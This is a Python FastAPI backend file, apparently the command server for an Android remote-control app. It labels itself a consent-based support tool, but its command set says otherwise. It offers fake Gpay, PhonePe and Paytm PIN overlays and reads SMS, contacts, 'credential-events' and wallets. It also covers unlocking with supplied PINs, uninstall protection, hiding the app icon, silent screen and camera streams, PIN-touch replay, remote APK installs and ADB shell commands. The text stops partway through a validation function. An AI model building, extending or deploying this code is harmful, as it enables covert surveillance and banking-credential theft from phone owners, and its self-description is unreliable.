from __future__ import annotations

import asyncio
import base64
import binascii
import fnmatch
import ipaddress
import json
import sqlite3
import uuid
from contextlib import asynccontextmanager
from pathlib import Path
from typing import Annotated, Any
from urllib.parse import parse_qs

import socketio
from fastapi import (
    Depends,
    FastAPI,
    Header,
    HTTPException,
    Query,
    Request,
    WebSocket,
    WebSocketDisconnect,
    status,
)
from fastapi.responses import JSONResponse, RedirectResponse, Response
from fastapi.staticfiles import StaticFiles

from .config import Settings
from .db import Database
from .legacy_protocol import (
    LegacyProtocolError,
    MAX_LEGACY_CIPHERTEXT_BYTES,
    collect_status_payload,
    decrypt_legacy_payload,
    encrypt_legacy_payload,
    find_device_identity,
)
from .realtime import DeviceConnection, RealtimeHub
from .schemas import (
    BatteryGuideRequest,
    BuildProfileRequest,
    CommandRequest,
    DeviceGroupCreateRequest,
    DeviceGroupUpdateRequest,
    DeviceLogRequest,
    HeartbeatRequest,
    DeviceSocketMessage,
    DeviceStatusRequest,
    DeviceUpdateRequest,
    LoginRequest,
    MessageTemplateCreateRequest,
    MessageTemplateUpdateRequest,
    PasswordChangeRequest,
    ReauthRequest,
    ReservedWorkbenchActionRequest,
    ScreenSessionRequest,
    UserCreateRequest,
    UserUpdateRequest,
)
from .security import (
    epoch_now,
    hash_password,
    normalize_totp_secret,
    random_token,
    token_hash,
    utc_now,
    verify_password,
    verify_totp,
)


FRONTEND_DIR = Path(__file__).resolve().parent.parent / "frontend"

COMMAND_RESPONSE_FIELDS = {
    "ack": {
        "type": "command.ack",
        "fields": ["message_id", "correlation_id", "payload"],
    },
    "result": {
        "type": "command.result",
        "fields": [
            "message_id",
            "correlation_id",
            "payload.success",
            "payload.result",
            "payload.error_code",
            "payload.error_message",
        ],
    },
}

ANDROID_SELF_REPORT_TYPES = {
    "screenshot",
    "adbScreenshot",
    "camPic",
    "relayStatus",
    "adbShellResult",
}

ANDROID_IMAGE_REPORT_TYPES = {"screenshot", "adbScreenshot", "camPic"}
MAX_ANDROID_REPORT_IMAGE_BYTES = 4 * 1024 * 1024


def protocol_item(
    group: str,
    name: str,
    interfaces: list[str],
    action: str | list[str] | None,
    parameters: Any,
    result_fields: Any,
    note: str,
    status: str = "implemented",
) -> dict[str, Any]:
    send_to_android = None
    receive_from_android = None
    if action is not None:
        send_to_android = {
            "type": "command.dispatch",
            "fields": ["message_id", "correlation_id"],
            "payload.action": action,
            "payload.parameters": parameters,
        }
        receive_from_android = {
            **COMMAND_RESPONSE_FIELDS,
            "payload.result fields": result_fields,
        }
    return {
        "group": group,
        "name": name,
        "interfaces": interfaces,
        "status": status,
        "send_to_android": send_to_android,
        "receive_from_android": receive_from_android,
        "stored_as": (
            "commands.status / commands.result_json / error_code / error_message"
            if action is not None
            else "不涉及 Android 命令"
        ),
        "note": note,
    }


CAPABILITY_CATALOG = [
    protocol_item(
        "连接与通用协议",
        "后台登录、账号和角色",
        ["POST /api/login", "GET /api/me", "GET/POST/PATCH /api/users"],
        None,
        None,
        None,
        "只在管理后台内处理，不向 Android 发送消息。",
    ),
    {
        "group": "连接与通用协议",
        "name": "Android WebSocket 连接与心跳",
        "interfaces": ["POST /api/device/ws-ticket", "WS /ws/device"],
        "status": "implemented",
        "send_to_android": {"type": "server.hello", "fields": ["time"]},
        "receive_from_android": {
            "types": ["device.hello", "device.heartbeat"],
            "fields": ["message_id", "payload"],
        },
        "stored_as": "device_sessions / devices.last_seen_at",
        "note": "设备凭据通过后建立连接；心跳只证明连接仍在。",
    },
    protocol_item(
        "连接与通用协议",
        "刷新",
        ["POST /api/command", "POST /api/device/status"],
        "refresh_status",
        {},
        [
            "battery_percent",
            "charging",
            "network_type",
            "screen_state",
            "locked",
            "lock_state_code",
            "accessibility_enabled",
            "battery_whitelist_enabled",
            "device_admin_enabled",
        ],
        "Android 也可主动发送 device.status；所有状态均为 Android 自报。",
    ),
    {
        "group": "连接与通用协议",
        "name": "通用命令回执",
        "interfaces": ["GET /api/commands", "GET /api/commands/{id}", "WS /ws/dashboard"],
        "status": "implemented",
        "send_to_android": {
            "type": "command.dispatch",
            "fields": ["message_id", "correlation_id", "payload.action", "payload.parameters"],
        },
        "receive_from_android": COMMAND_RESPONSE_FIELDS,
        "stored_as": "queued → sent → acknowledged → success | failed",
        "note": "success/failed 和 result 均来自 Android，不等同于设备真实效果。",
    },
    protocol_item(
        "控制区固定动作",
        "一键解锁 / 锁屏验证 / 一键翻译 / 电源 / 截图 / 摄像头",
        ["POST /api/devices/{id}/workbench-actions/{action}"],
        [
            "unlock",
            "verify-unlock",
            "translate",
            "power-menu",
            "screenshot",
            "front-camera",
            "rear-camera",
            "camera",
        ],
        {},
        "任意 Android 自报 JSON",
        "后台只发送固定 action；本仓库没有对应 Android 处理器。",
    ),
    protocol_item(
        "控制区固定动作",
        "打开应用 / 卸载应用",
        ["POST /api/devices/{id}/workbench-actions/{action}"],
        ["open-app", "uninstall-app"],
        {"package_name": "Android 包名"},
        "任意 Android 自报 JSON",
        "后台校验并转发 package_name，处理结果仍以 Android 自报为准。",
    ),
    protocol_item(
        "控制区固定动作",
        "锁屏 / 防删 / 桌面图标",
        ["POST /api/devices/{id}/workbench-actions/{action}"],
        ["lock-screen", "uninstall-protection", "launcher-icon"],
        {"enabled": "boolean"},
        "任意 Android 自报 JSON",
        "enabled 是后台发送的目标开关值，最终状态仍以 Android 自报为准。",
    ),
    protocol_item(
        "控制区固定动作",
        "遮盖层/仿页",
        ["POST /api/devices/{id}/workbench-actions/overlay-mode"],
        "overlay-mode",
        {"mode": ["纯黑色", "纯白色", "隐藏", "Gpay PIN", "Phonepe PIN", "Paytm PIN"]},
        "任意 Android 自报 JSON",
        "mode 只能取服务端白名单值。",
    ),
    protocol_item(
        "控制区固定动作",
        "支持提示与设置入口",
        ["POST /api/command"],
        ["show_support_prompt", "open_battery_settings", "open_autostart_settings"],
        {"show_support_prompt": {"message": "1-200 字符"}, "其他动作": {}},
        "任意 Android 自报 JSON",
        "支持提示只用于应用内可关闭说明；设置动作只请求打开公开设置页。",
    ),
    protocol_item(
        "Android 自报数据模块",
        "短信",
        ["POST /api/devices/{id}/workbench/messages/request", "GET /api/devices/{id}/workbench/messages"],
        "read-messages",
        {},
        {"items[]": ["id", "address", "direction", "body", "timestamp", "read", "slot"]},
        "后台不生成短信；页面只展示 Android 回传 JSON。",
    ),
    protocol_item(
        "Android 自报数据模块",
        "应用",
        ["POST /api/devices/{id}/workbench/apps/request", "GET /api/devices/{id}/workbench/apps"],
        "read-apps",
        {},
        {"items[]": ["package_name", "name", "version", "icon", "tag"]},
        "应用字段是建议结构，实际保存 Android 回传 JSON。",
    ),
    protocol_item(
        "Android 自报数据模块",
        "系统",
        ["POST /api/devices/{id}/workbench/system/request", "GET /api/devices/{id}/workbench/system"],
        "read-system",
        {},
        [
            "current_window",
            "current_package",
            "control_package",
            "app_name",
            "timezone",
            "locale",
            "device_time",
            "last_click",
            "brand",
            "model",
            "android_version",
            "sim_present",
            "phone_number",
            "available_memory",
            "total_memory",
            "cpu",
        ],
        "系统字段由 Android 自报，后台只保存和展示结果。",
    ),
    protocol_item(
        "Android 自报数据模块",
        "权限",
        ["POST /api/devices/{id}/workbench/permissions/request", "GET /api/devices/{id}/workbench/permissions"],
        "read-permissions",
        {},
        {"items[]": ["name", "state"]},
        "权限状态未经服务端验证。",
    ),
    protocol_item(
        "Android 自报数据模块",
        "相册",
        ["POST /api/devices/{id}/workbench/gallery/request", "GET /api/devices/{id}/workbench/gallery"],
        "read-gallery",
        {},
        {"items[]": ["id", "name", "mime_type", "size", "uri"]},
        "当前只保存和展示 JSON，不实现二进制图片上传。",
    ),
    protocol_item(
        "Android 自报数据模块",
        "通讯录",
        ["POST /api/devices/{id}/workbench/contacts/request", "GET /api/devices/{id}/workbench/contacts"],
        "read-contacts",
        {},
        {"items[]": ["id", "name", "phone"]},
        "后台不生成联系人；页面只展示 Android 回传 JSON。",
    ),
    protocol_item(
        "Android 自报数据模块",
        "文件",
        ["POST /api/devices/{id}/workbench/files/request", "GET /api/devices/{id}/workbench/files"],
        "read-files",
        {},
        {"path": "string", "items[]": ["name", "type", "size", "modified_at", "uri"]},
        "当前只处理目录 JSON，不实现文件二进制上传或下载。",
    ),
    protocol_item(
        "Android 自报数据模块",
        "剪切板",
        ["POST /api/devices/{id}/workbench/clipboard/request", "GET /api/devices/{id}/workbench/clipboard"],
        "read-clipboard",
        {},
        ["text", "updated_at"],
        "后台展示 Android 自报内容；清空和写入分别发送 clear-clipboard / write-clipboard。",
    ),
    protocol_item(
        "控制区固定动作",
        "清空 / 写入剪切板",
        ["POST /api/devices/{id}/workbench-actions/{action}"],
        ["clear-clipboard", "write-clipboard"],
        {"clear-clipboard": {}, "write-clipboard": {"text": "0-10000 字符"}},
        "任意 Android 自报 JSON",
        "后台只转发经过长度校验的文本，最终结果以 Android 自报为准。",
    ),
    protocol_item(
        "Android 自报数据模块",
        "输入、凭据和摄像头数据",
        [
            "POST /api/devices/{id}/workbench/input-events/request",
            "POST /api/devices/{id}/workbench/credential-events/request",
            "POST /api/devices/{id}/workbench/camera/request",
        ],
        ["read-input-events", "read-credential-events", "read-camera-data"],
        {},
        "任意 Android 自报虚拟 JSON",
        "本仓库没有采集器；只保存和展示 Android 自报的虚拟结果。",
    ),
    protocol_item(
        "屏幕协助",
        "显示投屏",
        ["POST /api/screen-sessions", "WS /ws/screen"],
        ["request_screen_share", "stop_screen_share"],
        {"request": ["session_id", "device_media_ticket", "media_ws_path", "consent_required"]},
        ["screen.session.status", "JPEG/WebP binary frame"],
        "后台只做会话和帧中继；Android 必须经过 MediaProjection 系统确认。",
    ),
    protocol_item(
        "后台管理",
        "设备、分组、模板、日志和审计",
        [
            "GET /api/devices",
            "GET/POST /api/device-groups",
            "GET/POST/PATCH /api/message-templates",
            "POST /api/device/logs",
        ],
        None,
        None,
        None,
        "后台数据管理功能，不属于 Android 命令协议。",
    ),
    protocol_item(
        "等待外部条件",
        "APK 编译、签名与产物上传",
        ["GET/POST /api/build-profiles", "POST /api/build-jobs"],
        None,
        None,
        None,
        "仍返回 501；未接入源码、签名证书和隔离构建环境。",
        "not_implemented",
    ),
]


RESERVED_WORKBENCH_MODULES = {
    "messages",
    "apps",
    "system",
    "permissions",
    "gallery",
    "contacts",
    "files",
    "clipboard",
    "input-events",
    "credential-events",
    "camera",
}

RESERVED_WORKBENCH_ACTIONS = {
    "unlock",
    "patternUnlock",
    "smartUnlock",
    "lockScreen",
    "power",
    "startCam",
    "stopCam",
    "openpkg",
    "uninstallApk",
    "antiDeleteOn",
    "antiDeleteOff",
    "startApk",
    "showShortcuts",
    "hideShortcuts",
    "iconAlias",
    "iconList",
    "black",
    "blackB",
    "lockNormal",
    "light",
    "lightT",
    "transparent",
    "openLayer",
    "showLockOverlay",
    "hideLockOverlay",
    "inputSend",
    "readSmsList",
    "walletList",
    "reqPerList",
    "readAlbumList",
    "readAlbumLast",
    "readAlbumThumbnail",
    "readContactList",
    "verify-unlock",
    "translate",
    "lock-screen",
    "uninstall-protection",
    "launcher-icon",
    "power-menu",
    "screenshot",
    "front-camera",
    "rear-camera",
    "camera",
    "open-app",
    "uninstall-app",
    "overlay-mode",
    "clear-clipboard",
    "write-clipboard",
}

WORKBENCH_TOGGLE_ACTIONS = {
    "lock-screen",
    "uninstall-protection",
    "launcher-icon",
}

WORKBENCH_OVERLAY_MODES = {
    "纯黑色",
    "纯白色",
    "隐藏",
    "Gpay PIN",
    "Phonepe PIN",
    "Paytm PIN",
}

WORKBENCH_MODULE_ACTIONS = {
    "messages": "read-messages",
    "apps": "read-apps",
    "system": "read-system",
    "permissions": "read-permissions",
    "gallery": "read-gallery",
    "contacts": "read-contacts",
    "files": "read-files",
    "clipboard": "read-clipboard",
    "input-events": "read-input-events",
    "credential-events": "read-credential-events",
    "camera": "read-camera-data",
}

LEGACY_REMAINING_FIXED_DATA: dict[str, dict[str, Any]] = {
    "screen_relay": {"quality": 30, "scale": 50},
    "startSilentStream": {"quality": 65, "size": 1},
    "silentShot": {"quality": 30, "size": 4},
    "startHD": {"width": 480, "height": 854, "quality": 25, "fps": 25},
    "setCam": {
        "index": 0,
        "quality": 50,
        "rotation": 0,
        "frameRate": 15,
        "width": 640,
        "zoom": 0,
    },
    "admLockRule": {"quality": 0, "minLength": 0},
    "startAdbStream": {"quality": 40, "interval": 800},
    "startAdbTree": {"interval": 800},
}

LEGACY_REMAINING_EMPTY_ACTIONS = {
    "capture",
    "takeScreen",
    "capturePic",
    "gestureCapture",
    "stopSilentStream",
    "stopHD",
    "startHDBlack",
    "stopHDBlack",
    "stopScreenRelay",
    "lockUpdate",
    "lockAndroidUpdate",
    "touchOn",
    "touchOff",
    "Awake",
    "wakeup",
    "cancelWakeup",
    "cancelAwake",
    "swipePwdScreenOn",
    "swipePwdScreenOff",
    "touchUp",
    "up",
    "rightClick",
    "home",
    "back",
    "recent",
    "volumeUp",
    "volumeDown",
    "muteDevice",
    "dndOn",
    "dndOff",
    "closeNewWin",
    "setDebugOn",
    "setDebugOff",
    "disableBiometric",
    "enableBiometric",
    "admSet",
    "adm",
    "admLock",
    "restartApp",
    "restartMe",
    "restartSc",
    "reOpenMe",
    "uninstallShell",
    "reConn",
    "closeEnv",
    "requestfloaty",
    "installPermission",
    "reqScreenPermission",
    "releaseScreenCapture",
    "closeProtect",
    "disablePocketMode",
    "callAppSetting",
    "callAcc",
    "autoBoot",
    "backstage",
    "autoRequestPerm",
    "utPause",
    "utResume",
    "startWebRTC",
    "stopWebRTC",
    "replacePinTargets",
    "ask_relay",
    "startAutoPair",
    "adbScreenshot",
    "adbUiTree",
    "adbBlackScreen",
    "adbLockNormal",
    "adbLockUpdate",
    "adbLockAndroidUpdate",
    "adbBlackScreenOff",
    "adbUnlock",
    "adbDisconnect",
    "disableAcc",
    "enableAcc",
    "stopAdbStream",
    "stopAdbTree",
    "adbStatus",
}

LEGACY_REMAINING_REQUIRED_FIELDS: dict[str, set[str]] = {
    "lockAdvance": {"type", "title", "subtitle"},
    "setWakeup": {"enable"},
    "clickPoint": {"x", "y"},
    "touchDown": {"x", "y"},
    "down": {"x", "y"},
    "touchMove": {"x", "y"},
    "move": {"x", "y"},
    "clickB": {"bounds"},
    "clickInput": {"bounds"},
    "gestureB": {"gesture"},
    "gestureUnlock": {"points"},
    "setSoundVibrate": {"on"},
    "dnd": {"dnd"},
    "doNotDisturb": {"dnd"},
    "fetchIcon": {"pkg"},
    "init_data": {"selfPkg", "homepage", "prepage", "accpage", "waitpage"},
    "setDomain": {"domain"},
    "catAllViewSwitch": {
        "enable",
        "screenRule",
        "rexp",
        "pkgs",
        "refuse",
        "idSearch",
        "imeChar",
        "domain",
    },
    "sendAlert": {"title", "content", "okText", "openpkg"},
    "openIntent": {"map"},
    "openUrl": {"url"},
    "setDebugMode": {"debug"},
    "setHideMode": {"hide"},
    "setDisConnect": {"disconn"},
    "logMode": {"mode"},
    "installApk": {"url", "fileMd5"},
    "updateApk": {"url", "fileMd5"},
    "admPwd": {"pwd"},
    "permission": {"type"},
    "permissionB": {"type"},
    "realtimeSet": {"interval"},
    "realtimeOnOff": {"on"},
    "webrtcOffer": {"sdp"},
    "webrtcIce": {"candidate", "sdpMLineIndex", "sdpMid"},
    "hideMyMainActivity": {"iconAlias", "show"},
    "openWebHarvester": {"url"},
    "addPinTargets": {"keywords", "packages"},
    "touchPinReplay": {"touches", "pkg"},
    "manualPair": {"code", "port"},
    "adbShell": {"cmd"},
    "adbClick": {"x", "y"},
    "adbSwipe": {"x1", "y1", "x2", "y2", "duration"},
    "adbKeyEvent": {"key"},
}

LEGACY_REMAINING_SPECIAL_ACTIONS = {"updatePageRule"}
LEGACY_REMAINING_ACTIONS = (
    set(LEGACY_REMAINING_FIXED_DATA)
    | LEGACY_REMAINING_EMPTY_ACTIONS
    | set(LEGACY_REMAINING_REQUIRED_FIELDS)
    | LEGACY_REMAINING_SPECIAL_ACTIONS
)
RESERVED_WORKBENCH_ACTIONS.update(LEGACY_REMAINING_ACTIONS)


def create_app(settings: Settings | None = None) -> FastAPI:
    settings = settings or Settings.from_env()
    database = Database(settings.database_path)
    hub = RealtimeHub()
    sio = socketio.AsyncServer(async_mode="asgi", cors_allowed_origins=[])
    legacy_contexts: dict[str, dict[str, Any]] = {}
    legacy_bound_devices: dict[str, str] = {}
    legacy_device_sids: dict[str, str] = {}
    binary_connections: dict[str, WebSocket] = {}
    binary_send_locks: dict[str, asyncio.Lock] = {}

    def bind_legacy_device(sid: str, device_id: str) -> None:
        previous_device_id = legacy_bound_devices.get(sid)
        if (
            previous_device_id is not None
            and previous_device_id != device_id
            and legacy_device_sids.get(previous_device_id) == sid
        ):
            legacy_device_sids.pop(previous_device_id, None)
        legacy_bound_devices[sid] = device_id
        legacy_device_sids[device_id] = sid

    async def mark_disconnected(
        connection: DeviceConnection, reason: str, close_socket: bool = False
    ) -> None:
        removed = await hub.unregister_device(connection)
        if not removed:
            return
        if close_socket:
            try:
                await connection.websocket.close(code=4000, reason=reason)
            except RuntimeError:
                pass
        now = utc_now()

        def update(conn: sqlite3.Connection) -> dict[str, Any] | None:
            conn.execute(
                "UPDATE device_sessions SET disconnected_at=?, disconnect_reason=? "
                "WHERE id=? AND disconnected_at IS NULL",
                (now, reason, connection.session_id),
            )
            conn.execute(
                "UPDATE device_status SET online=0, updated_at=? WHERE device_id=?",
                (now, connection.device_id),
            )
            return conn.execute(
                "SELECT owner_user_id FROM devices WHERE id=?",
                (connection.device_id,),
            ).fetchone()

        owner_row = database.transaction(update)
        await hub.broadcast_dashboard(
            {
                "type": "device.offline",
                "device_id": connection.device_id,
                "reason": reason,
                "time": now,
            },
            owner_row["owner_user_id"] if owner_row else None,
        )

    async def stale_connection_monitor() -> None:
        interval = max(5, settings.device_offline_after_seconds // 3)
        while True:
            await asyncio.sleep(interval)
            for connection in await hub.stale_connections(
                settings.device_offline_after_seconds
            ):
                await mark_disconnected(connection, "heartbeat_timeout", close_socket=True)
            heartbeat_cutoff = epoch_now() - settings.heartbeat_offline_after_seconds
            stale_heartbeat_devices = database.all(
                "SELECT d.id,d.owner_user_id FROM devices d "
                "JOIN device_status s ON s.device_id=d.id "
                "WHERE s.online=1 AND d.last_heartbeat_epoch IS NOT NULL "
                "AND d.last_heartbeat_epoch<?",
                (heartbeat_cutoff,),
            )
            for stale_device in stale_heartbeat_devices:
                device_id = stale_device["id"]
                if device_id in legacy_device_sids or await hub.is_online(device_id):
                    continue
                now = utc_now()
                database.execute(
                    "UPDATE device_status SET online=0,updated_at=? WHERE device_id=?",
                    (now, device_id),
                )
                await hub.broadcast_dashboard(
                    {
                        "type": "device.offline",
                        "device_id": device_id,
                        "reason": "heartbeat_timeout",
                        "time": now,
                    },
                    stale_device["owner_user_id"],
                )

    @asynccontextmanager
    async def lifespan(_: FastAPI):
        database.initialize(
            settings.bootstrap_admin_username, settings.bootstrap_admin_password
        )
        monitor = asyncio.create_task(stale_connection_monitor())
        try:
            yield
        finally:
            monitor.cancel()
            try:
                await monitor
            except asyncio.CancelledError:
                pass

    app = FastAPI(
        title="Authorized Device Backend",
        version="0.1.0",
        description=(
            "Consent-based Android device inventory and support backend. "
            "Stealth, credential collection and anti-removal capabilities are excluded."
        ),
        lifespan=lifespan,
    )
    app.state.settings = settings
    app.state.db = database
    app.state.hub = hub

    app.mount(
        "/admin",
        StaticFiles(directory=str(FRONTEND_DIR), html=True),
        name="admin",
    )

    @app.get("/", include_in_schema=False)
    def root():
        return RedirectResponse(url="/admin/", status_code=307)

    @app.middleware("http")
    async def request_id_middleware(request: Request, call_next):
        request_id = request.headers.get("X-Request-Id") or str(uuid.uuid4())
        request.state.request_id = request_id
        try:
            response = await call_next(request)
        except Exception:
            raise
        response.headers["X-Request-Id"] = request_id
        response.headers["Cache-Control"] = "no-store"
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["Referrer-Policy"] = "no-referrer"
        return response

    def envelope(request: Request, data: Any, status_code: int = 200) -> JSONResponse:
        return JSONResponse(
            {"data": data, "meta": {"request_id": request.state.request_id}},
            status_code=status_code,
        )

    def bearer_token(authorization: str | None) -> str:
        if not authorization or not authorization.startswith("Bearer "):
            raise HTTPException(status_code=401, detail="missing bearer token")
        token = authorization[7:].strip()
        if not token:
            raise HTTPException(status_code=401, detail="missing bearer token")
        return token

    def current_user(
        authorization: Annotated[str | None, Header()] = None,
    ) -> dict[str, Any]:
        token = bearer_token(authorization)
        row = database.one(
            "SELECT s.id AS session_id,s.reauth_at_epoch,s.expires_at_epoch,s.revoked_at_epoch,"
            "u.id,u.username,u.role,u.status,u.deleted_at FROM sessions s "
            "JOIN users u ON u.id=s.user_id WHERE s.token_hash=?",
            (token_hash(token),),
        )
        if (
            row is None
            or row["status"] != "active"
            or row["deleted_at"] is not None
            or row["revoked_at_epoch"] is not None
            or row["expires_at_epoch"] < epoch_now()
        ):
            raise HTTPException(status_code=401, detail="invalid or expired session")
        return row

    def require_role(user: dict[str, Any], *roles: str) -> None:
        if user["role"] not in roles:
            raise HTTPException(status_code=403, detail="insufficient role")

    def require_recent_reauth(user: dict[str, Any]) -> None:
        reauth_at = user.get("reauth_at_epoch")
        if reauth_at is None or epoch_now() - reauth_at > settings.reauth_ttl_seconds:
            raise HTTPException(status_code=403, detail="recent reauthentication required")

    def normalized_ip_whitelist(value: str) -> str:
        entries = [item.strip() for item in value.replace(",", "\n").splitlines() if item.strip()]
        if len(entries) > 100:
            raise HTTPException(status_code=400, detail="IP whitelist accepts at most 100 entries")
        normalized: list[str] = []
        for entry in entries:
            try:
                normalized.append(str(ipaddress.ip_network(entry, strict=False)))
            except ValueError as exc:
                raise HTTPException(status_code=400, detail=f"invalid IP whitelist entry: {entry}") from exc
        return "\n".join(dict.fromkeys(normalized))

    def ip_is_allowed(client_ip: str | None, whitelist: str) -> bool:
        if not whitelist:
            return True
        try:
            address = ipaddress.ip_address(client_ip or "")
        except ValueError:
            return False
        return any(
            address in ipaddress.ip_network(entry, strict=False)
            for entry in whitelist.splitlines()
            if entry
        )

    def visible_device(device_id: str, user: dict[str, Any]) -> dict[str, Any]:
        device = database.one("SELECT * FROM devices WHERE id=?", (device_id,))
        if device is None:
            raise HTTPException(status_code=404, detail="device not found")
        if user["role"] != "admin" and device["owner_user_id"] != user["id"]:
            raise HTTPException(status_code=404, detail="device not found")
        return device

    def reserved_not_implemented(feature: str) -> None:
        """Keep the documented route contract without any device-side executor."""
        raise HTTPException(
            status_code=status.HTTP_501_NOT_IMPLEMENTED,
            detail={
                "code": "RESERVED_NOT_IMPLEMENTED",
                "feature": feature,
                "message": "接口已按参考素材预留，当前未实现执行逻辑",
            },
        )

    def visible_screen_session(
        session_id: str, user: dict[str, Any]
    ) -> dict[str, Any]:
        row = database.one(
            "SELECT ss.*,d.owner_user_id,d.name AS device_name FROM screen_sessions ss "
            "JOIN devices d ON d.id=ss.device_id WHERE ss.id=?",
            (session_id,),
        )
        if row is None or (
            user["role"] != "admin" and row["owner_user_id"] != user["id"]
        ):
            raise HTTPException(status_code=404, detail="screen session not found")
        return row

    def device_identity(
        x_device_id: Annotated[str | None, Header()] = None,
        x_device_token: Annotated[str | None, Header()] = None,
    ) -> dict[str, Any]:
        if not x_device_id or not x_device_token:
            raise HTTPException(status_code=401, detail="missing device credentials")
        device = database.one("SELECT * FROM devices WHERE id=?", (x_device_id,))
        if device is None or device["device_token_hash"] != token_hash(x_device_token):
            raise HTTPException(status_code=401, detail="invalid device credentials")
        return device

    def validate_command_payload(action: str, payload: dict[str, Any]) -> None:
        if action == "show_support_prompt":
            if set(payload) - {"message"}:
                raise HTTPException(status_code=400, detail="unknown support prompt field")
            message = payload.get("message", "")
            if not isinstance(message, str) or not 1 <= len(message) <= 200:
                raise HTTPException(status_code=400, detail="message must be 1-200 characters")
            return
        if payload:
            raise HTTPException(status_code=400, detail="this action accepts no payload")

    def workbench_action_payload(
        action: str, body: ReservedWorkbenchActionRequest
    ) -> dict[str, Any]:
        parameters: dict[str, Any] = {}
        if action in WORKBENCH_TOGGLE_ACTIONS:
            if body.payload:
                raise HTTPException(status_code=400, detail="this action accepts no payload")
            if type(body.value) is not bool:
                raise HTTPException(status_code=400, detail="toggle value must be boolean")
            parameters["enabled"] = body.value
        elif action == "overlay-mode":
            if body.payload:
                raise HTTPException(status_code=400, detail="this action accepts no payload")
            if body.value not in WORKBENCH_OVERLAY_MODES:
                raise HTTPException(status_code=400, detail="unsupported overlay mode")
            parameters["mode"] = body.value
        elif action in {"open-app", "uninstall-app"}:
            if body.value is not None or set(body.payload) != {"package_name"}:
                raise HTTPException(status_code=400, detail="package_name is required")
            package_name = body.payload.get("package_name")
            if not isinstance(package_name, str) or not 1 <= len(package_name) <= 255:
                raise HTTPException(status_code=400, detail="invalid package_name")
            parameters["package_name"] = package_name
        elif action in {"openpkg", "uninstallApk", "startApk"}:
            if body.value is not None or set(body.payload) != {"pkg"}:
                raise HTTPException(status_code=400, detail="pkg is required")
            package_name = body.payload.get("pkg")
            if not isinstance(package_name, str) or not 1 <= len(package_name) <= 255:
                raise HTTPException(status_code=400, detail="invalid pkg")
            parameters["pkg"] = package_name
        elif action == "write-clipboard":
            if body.value is not None or set(body.payload) != {"text"}:
                raise HTTPException(status_code=400, detail="clipboard text is required")
            text = body.payload.get("text")
            if not isinstance(text, str) or len(text) > 10000:
                raise HTTPException(status_code=400, detail="invalid clipboard text")
            parameters["text"] = text
        elif action == "patternUnlock":
            if body.value is not None or set(body.payload) != {"pattern"}:
                raise HTTPException(status_code=400, detail="unlock pattern is required")
            pattern = body.payload.get("pattern")
            if not isinstance(pattern, str) or not 1 <= len(pattern) <= 64:
                raise HTTPException(status_code=400, detail="invalid unlock pattern")
            parameters["pattern"] = pattern
        elif action == "smartUnlock":
            if body.value is not None or set(body.payload) != {"type", "credential"}:
                raise HTTPException(status_code=400, detail="unlock credential is required")
            credential_type = body.payload.get("type")
            credential = body.payload.get("credential")
            if credential_type not in {"auto", "pin", "password", "pattern"}:
                raise HTTPException(status_code=400, detail="invalid credential type")
            if not isinstance(credential, str) or not 1 <= len(credential) <= 256:
                raise HTTPException(status_code=400, detail="invalid unlock credential")
            parameters.update({"type": credential_type, "credential": credential})
        elif action == "startCam":
            if body.value is not None or set(body.payload) != {"index"}:
                raise HTTPException(status_code=400, detail="camera index is required")
            camera_index = body.payload.get("index")
            if type(camera_index) is not int or camera_index not in {0, 1}:
                raise HTTPException(status_code=400, detail="invalid camera index")
            parameters["index"] = camera_index
        elif action == "iconAlias":
            if body.value is not None or set(body.payload) != {"alias", "show"}:
                raise HTTPException(status_code=400, detail="alias and show are required")
            alias = body.payload.get("alias")
            show = body.payload.get("show")
            if not isinstance(alias, str) or not 1 <= len(alias) <= 120:
                raise HTTPException(status_code=400, detail="invalid icon alias")
            if type(show) is not bool:
                raise HTTPException(status_code=400, detail="show must be boolean")
            parameters.update({"alias": alias, "show": show})
        elif action == "transparent":
            if body.value is not None or set(body.payload) != {
                "url",
                "fullscreen",
                "through",
            }:
                raise HTTPException(status_code=400, detail="invalid transparent payload")
            url = body.payload.get("url")
            fullscreen = body.payload.get("fullscreen")
            through = body.payload.get("through")
            if (
                not isinstance(url, str)
                or not 1 <= len(url) <= 2048
                or not url.lower().startswith(("http://", "https://"))
            ):
                raise HTTPException(status_code=400, detail="invalid transparent url")
            if type(fullscreen) is not bool or type(through) is not bool:
                raise HTTPException(status_code=400, detail="overlay flags must be boolean")
            parameters.update(
                {"url": url, "fullscreen": fullscreen, "through": through}
            )
        elif action == "openLayer":
            if body.value is not None or set(body.payload) != {"url"}:
                raise HTTPException(status_code=400, detail="url is required")
            url = body.payload.get("url")
            if (
                not isinstance(url, str)
                or not 1 <= len(url) <= 2048
                or not url.lower().startswith(("http://", "https://"))
            ):
                raise HTTPException(status_code=400, detail="invalid layer url")
            parameters["url"] = url
        elif action == "showLockOverlay":
            if body.value is not None or set(body.payload) != {
                "type",
                "title",
                "subtitle",
            }:
                raise HTTPException(status_code=400, detail="invalid lock overlay payload")
            overlay_type = body.payload.get("type")
            title = body.payload.get("title")
            subtitle = body.payload.get("subtitle")
            if not isinstance(overlay_type, str) or not 1 <= len(overlay_type) <= 64:
                raise HTTPException(status_code=400, detail="invalid lock overlay type")
            if not isinstance(title, str) or len(title) > 200:
                raise HTTPException(status_code=400, detail="invalid lock overlay title")
            if not isinstance(subtitle, str) or len(subtitle) > 500:
                raise HTTPException(status_code=400, detail="invalid lock overlay subtitle")
            parameters.update(
                {"type": overlay_type, "title": title, "subtitle": subtitle}
            )
        elif action == "inputSend":
            if body.value is not None or set(body.payload) != {"input"}:
                raise HTTPException(status_code=400, detail="input is required")
            input_text = body.payload.get("input")
            if not isinstance(input_text, str) or not 1 <= len(input_text) <= 10000:
                raise HTTPException(status_code=400, detail="invalid input text")
            parameters["input"] = input_text
        elif action == "readAlbumLast":
            if (
                body.value is not None
                or "path" not in body.payload
                or set(body.payload) - {"path", "del"}
            ):
                raise HTTPException(status_code=400, detail="album path is required")
            path = body.payload.get("path")
            delete_after_read = body.payload.get("del", False)
            if not isinstance(path, str) or not 1 <= len(path) <= 4096:
                raise HTTPException(status_code=400, detail="invalid album path")
            if type(delete_after_read) is not bool:
                raise HTTPException(status_code=400, detail="del must be boolean")
            parameters.update({"path": path, "del": delete_after_read})
        elif action == "readAlbumThumbnail":
            if body.value is not None or set(body.payload) != {
                "fileList",
                "maxWidth",
                "elem",
            }:
                raise HTTPException(status_code=400, detail="invalid thumbnail payload")
            file_list = body.payload.get("fileList")
            max_width = body.payload.get("maxWidth")
            elem = body.payload.get("elem")
            if not isinstance(file_list, list) or not 1 <= len(file_list) <= 500:
